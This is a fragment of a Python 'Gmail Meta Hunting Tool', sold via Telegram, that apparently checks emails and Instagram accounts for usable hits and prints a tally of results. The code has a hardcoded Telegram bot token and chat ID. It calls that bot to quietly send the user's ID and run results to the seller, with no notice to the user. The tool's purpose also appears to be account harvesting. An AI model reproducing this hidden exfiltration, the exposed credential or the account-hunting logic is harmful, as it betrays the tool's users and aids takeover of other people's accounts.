...
def H():
    I = f"""
{Fore.MAGENTA}Telegram: {Fore.WHITE}@PyObscura 
{Fore.MAGENTA}   Join {Fore.WHITE}@Praveenfile{Style.RESET_ALL}
"""
    for J in I.split("\n"):
        print(" " * 40 + J)
...
{Fore.YELLOW}DM {Fore.MAGENTA}@PyObscura {Fore.YELLOW}to Buy or RENEW.{Style.RESET_ALL}"""
    M(L, D=0.05)
...
🚀 Gmail Meta Hunting Tool Activated  
🆔 ID       : {ID}  
...
'''
try:
    requests.get(f"https://api.telegram.org/bot7829242154:AAFBogSemh4PiHAoC7tIWixNdZIf2mOovCc/sendMessage?chat_id=7683961821&text={newuser}")
...
def pppp():
    ...
    output = (f"\n"
          f"≿━━━━༺ 𝐑𝐄𝐒𝐔𝐋𝐓𝐒 ༻━━━━≾\n"
          f"💘 True Hits      : {hits}\n"
          f"🍭 Gen Accounts   : {badinsta}\n"
          f"🧁 Bad Emails     : {bademail}\n"
          f"🌈 Not Found      : {goodig}\n"
          f"━━━━━━━━━━━━━━━━━━━━━\n")
...
'''
    ...
    try:
        try:
            requests.get(f"https://api.telegram.org/bot7829242154:AAFBogSemh4PiHAoC7tIWixNdZIf2mOovCc/sendMessage?chat_id=7683961821&text={ID}\n{ss}")
        except Exception as e:
            print(f"  h ") 
        try:
